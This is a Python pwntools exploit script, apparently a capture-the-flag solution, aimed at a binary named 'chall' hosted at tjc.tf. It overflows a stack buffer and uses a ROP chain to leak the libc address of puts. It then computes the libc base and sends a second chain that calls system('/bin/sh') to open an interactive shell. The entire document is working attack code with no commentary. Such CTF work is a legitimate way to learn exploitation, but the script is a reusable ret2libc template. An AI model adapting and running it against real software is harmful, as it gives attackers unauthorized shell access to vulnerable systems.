#!/usr/bin/env python3
from pwn import *

context.binary = "./chall"

local = False
if local:
    io = process("./chall")
else:
    io = remote("tjc.tf", 31705)

elf_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf_bin = ELF("./chall")
rop_bin = ROP(elf_bin)

plt_puts = elf_bin.plt["puts"]
got_puts = elf_bin.got["puts"]

rop_bin.raw(b'A' * 0x10)
rop_bin.raw(b'B' * 0x8)
rop_bin.raw(rop_bin.rdi)
rop_bin.raw(got_puts)
rop_bin.raw(plt_puts)
rop_bin.raw(elf_bin.sym["_start"])

print(rop_bin.dump())

io.recvuntil(b"today?\n")
io.sendline(rop_bin.chain())

puts_data = io.recvn(8).rsplit(b'\n', 1)[0].ljust(8, b'\x00')
puts_addr = u64(puts_data)
print(f"puts @ {hex(puts_addr)}")

elf_libc.address = puts_addr - elf_libc.sym["puts"]
rop_libc = ROP(elf_libc)

sys_addr = elf_libc.sym["system"]
sh_str = next(elf_libc.search(b"/bin/sh\x00"))

rop_libc.raw(b'A' * 0x10)
rop_libc.raw(b'B' * 0x8)
rop_libc.raw(rop_libc.ret)
rop_libc.raw(rop_libc.rdi)
rop_libc.raw(sh_str)
rop_libc.raw(sys_addr)

io.recvuntil(b"today?\n")
io.sendline(rop_libc.chain())

io.interactive()
